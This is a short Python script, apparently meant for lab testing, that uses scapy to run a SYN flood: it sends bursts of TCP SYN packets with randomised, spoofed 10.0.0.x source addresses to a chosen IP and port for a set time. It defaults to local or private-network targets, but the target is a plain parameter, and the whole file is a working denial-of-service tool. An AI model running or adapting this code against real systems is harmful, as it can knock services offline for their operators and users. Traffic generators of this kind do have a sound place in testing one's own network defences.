
import random
import time
from scapy.all import IP, TCP, send

def simulate_syn_flood(target_ip="127.0.0.1", target_port=80, duration=60):
    print(f"🚀 Simulating SYN Flood on {target_ip}:{target_port}")
    start_time = time.time()
    packet_count = 0

    try:
        while time.time() - start_time < duration:
            # Send bursts of SYN packets
            for _ in range(5):
                src_ip = f"10.0.0.{random.randint(1, 254)}"
                src_port = random.randint(1024, 65535)
                packet = IP(src=src_ip, dst=target_ip)/TCP(sport=src_port, dport=target_port, flags="S")
                send(packet, verbose=0)
                packet_count += 1
            time.sleep(0.1)  # Control attack rate

        print(f"✅ Sent {packet_count} SYN packets in {duration} seconds")
    except KeyboardInterrupt:
        print(f"🛑 Stopped early. Sent {packet_count} packets")

if __name__ == "__main__":
    simulate_syn_flood(target_ip="192.168.56.1", duration=30)  # Replace with your local IP